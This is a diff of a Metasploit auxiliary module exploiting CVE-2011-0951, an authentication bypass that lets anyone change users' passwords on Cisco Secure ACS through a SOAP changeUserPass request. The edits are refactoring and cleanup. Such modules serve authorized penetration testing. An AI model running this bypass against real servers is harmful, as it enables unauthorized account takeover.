@@ -17,28 +17,28 @@ class Metasploit4 < Msf::Auxiliary
 	include Msf::Auxiliary::Report
 	include Msf::Auxiliary::Scanner
 
-	def initialize
-		super(
-			'Name'         => 'Cisco Secure ACS Version < 5.1.0.44.5 or 5.2.0.26.2 and Unauthorized Password Change',
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'         => 'Cisco Secure ACS Version < 5.1.0.44.5 or 5.2.0.26.2 Unauthorized Password Change',
 			'Version'      => '$Revision$',
 			'Description'  => %q{
-				This module exploits an authentication bypass issue which allows arbitrary 
-				password change requests to be issued for any user in the local store.  
-				Instances of Secure ACS running version 5.1 with patches 3, 4, or 5 as well 
-				as version 5.2 with either no patches or patches 1 and 2 are vulnerable. 
+				This module exploits an authentication bypass issue which allows arbitrary
+				password change requests to be issued for any user in the local store.
+				Instances of Secure ACS running version 5.1 with patches 3, 4, or 5 as well
+				as version 5.2 with either no patches or patches 1 and 2 are vulnerable.
 				},
 			'References'     =>
 				[
 					['BID', '47093'],
 					['CVE', 'CVE-2011-0951'],
-					['URL', 'http://www.cisco.com/en/US/products/csa/cisco-sa-20110330-acs.html'],
+					['URL', 'http://www.cisco.com/en/US/products/csa/cisco-sa-20110330-acs.html']
 				],
 			'Author'         =>
 				[
-					'Jason Kratzer<pyoor[at]flinkd.org>',
+					'Jason Kratzer<pyoor[at]flinkd.org>'
 				],
 			'License'      => MSF_LICENSE
-		)
+		))
 
 		register_options(
 			[
@@ -46,7 +46,7 @@ class Metasploit4 < Msf::Auxiliary
 				OptString.new('TARGETURI', [true, 'Path to UCP WebService', '/PI/services/UCP/']),
 				OptString.new('USERNAME', [true, 'Username to use', '']),
 				OptString.new('PASSWORD', [true, 'Password to use', '']),
-				OptBool.new('SSL', [true, 'Use SSL', true],),
+				OptBool.new('SSL', [true, 'Use SSL', true],)
 			], self.class)
 	end
 
@@ -80,12 +80,12 @@ class Metasploit4 < Msf::Auxiliary
 
 		begin
 			res = send_request_cgi({
-				'uri'     => "#{datastore['TARGETURI']}",
+				'uri'     => target_uri.path,
 				'method'  => 'POST',
 				'data'    => data,
 				'headers' =>
 					{
-						'SOAPAction'      => '"changeUserPass"',
+						'SOAPAction' => '"changeUserPass"',
 					}
 			}, 60)
 
@@ -112,7 +112,7 @@ class Metasploit4 < Msf::Auxiliary
 			end
 		else
 			print_error("#{rhost} - Failed! The webserver issued a #{res.code} response.")
-			print_error("Please validate the TARGETURI and try again.")
+			print_error("Please validate the TARGETURI option and try again.")
 		end
 
 	end
